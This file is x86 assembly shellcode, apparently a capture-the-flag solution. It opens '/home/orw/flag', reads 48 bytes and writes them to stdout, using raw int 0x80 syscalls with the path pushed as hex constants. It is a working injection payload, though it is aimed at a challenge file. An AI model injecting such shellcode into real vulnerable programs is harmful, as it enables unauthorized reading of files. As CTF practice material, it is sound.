section .text

global _start

_start:
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    mov eax, 0x5  ;sys_open
    push ebx
    push 0x67616c66
    push 0x2f77726f
    push 0x2f656d6f
    push 0x682f2f2f
    mov ebx, esp
    int 0x80

    xor ebx, ebx
    mov ebx, eax
    xor eax, eax

    mov eax, 0x3  ;sys_read
    mov ecx, esp
    mov dl, 0x30  ;len
    int 0x80

    mov eax, 0x4  ;sys_write
    mov bl, 0x1  ;stdout
    int 0x80

    mov eax, 0x1 ;sys_exit
    int 0x80
